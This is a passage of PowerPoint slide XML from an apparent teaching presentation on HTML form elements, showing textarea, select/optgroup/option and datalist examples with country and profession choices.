                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>wrap</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
                        <a:t>soft</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> | hard</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74787" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9989AF8-F2F0-47E3-8CCB-7529A1BD11F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5789613" y="1593850"/>
            <a:ext cx="6138862" cy="4989513"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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label</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id_message</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r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Message:</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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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br</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textarea</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message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id_message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rows</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"6"</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cols</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"60"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maxlength</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"1000"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>placeholder</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Type</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here</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your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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message</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. Max 1000 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>characters</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required</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>textarea</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br</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textarea</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prefilled</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prefilled</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rows</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"10"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cols</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"60"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Prefilled</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text</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here</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>which</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you</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>can</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edit</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textarea</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3D81500E-FA18-4787-B7E8-7114CAD14E4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;select&gt;, &lt;optgroup&gt;, &lt;option&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75779" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71EAAA1E-564C-4E6F-899B-349B0DD0D8B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="4891682"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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label</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"country"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Country:</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label</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select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"country"</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"country"</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optgroup</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label</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Scandinavia</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&lt;option</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"de"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Denmark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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&lt;option</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"no"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Norway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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&lt;option</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sv</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r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Sweden</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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optgroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</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optgroup</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label</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"Baltic"</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&lt;option</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"es"</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selected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Estonia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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&lt;option</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"lv"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Latvia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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&lt;option</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lt</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r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Lithuania</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/option&gt;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optgroup</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select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164CE6BF-B19A-497F-8B4D-601CD95A4AAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;datalist&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76803" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0353B053-34E6-4290-80F9-63C898C670E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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profession</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Profession</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>label</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>list</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professions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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profession</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>size</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"40"</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>datalist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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professions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;option</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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nurse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;option</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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teacher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
